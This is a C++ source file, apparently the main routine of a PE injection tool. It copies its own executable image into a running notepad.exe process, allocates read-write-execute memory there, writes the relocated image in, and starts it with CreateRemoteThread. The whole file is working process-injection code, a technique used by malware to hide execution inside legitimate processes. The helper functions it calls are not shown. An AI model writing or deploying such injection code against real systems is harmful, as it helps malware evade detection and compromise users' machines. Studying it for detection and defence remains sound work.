#include "..\inc\main.hpp"


int main() {
    // Get the current images base address and size
    HMODULE base = GetModuleHandleA(0);
    PIMAGE_DOS_HEADER idh = (PIMAGE_DOS_HEADER)(base);
    PIMAGE_NT_HEADERS pnths = (PIMAGE_NT_HEADERS)((DWORD_PTR)(base)+idh->e_lfanew);
    size_t PEsz = pnths->OptionalHeader.SizeOfImage;

    // Allocate enough memory for the image inside the processes own address space
    LPVOID allocmem = VirtualAlloc(0, PEsz, MEM_COMMIT, PAGE_READWRITE);
    memcpy(allocmem, base, PEsz); // Copy the PE Headers to the local allocated memory  

    // Opening the process to use it to allocate memory in it 
    HANDLE TheProcess = OpenProcess(MAXIMUM_ALLOWED, 0, PortableExecutable::GetPid(TEXT("notepad.exe")));
    if (!TheProcess) {
        std::cout << "Process Not Found ! Error Code: " << GetLastError() << std::endl;
        return -1;
    }
    LPVOID S_allocmem = VirtualAllocEx(TheProcess, 0, PEsz, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    DWORD_PTR BaseOffset = (DWORD_PTR)S_allocmem - (DWORD_PTR)base; // Calculating the offset between the addresses where the image is located using virtualallocex
    
    PortableExecutable::Reallocation();
    
    bool wpm = WriteProcessMemory(TheProcess, S_allocmem, allocmem, PEsz, 0); // Copy the local image into the memory region allocated in the target process
    HANDLE crt = CreateRemoteThread(TheProcess, 0, NULL, (LPTHREAD_START_ROUTINE)((DWORD_PTR)PortableExecutable::Inject + BaseOffset), 0, 0, 0); // Create a new thread with the start address set to the remote address of the function 

    return 0;
}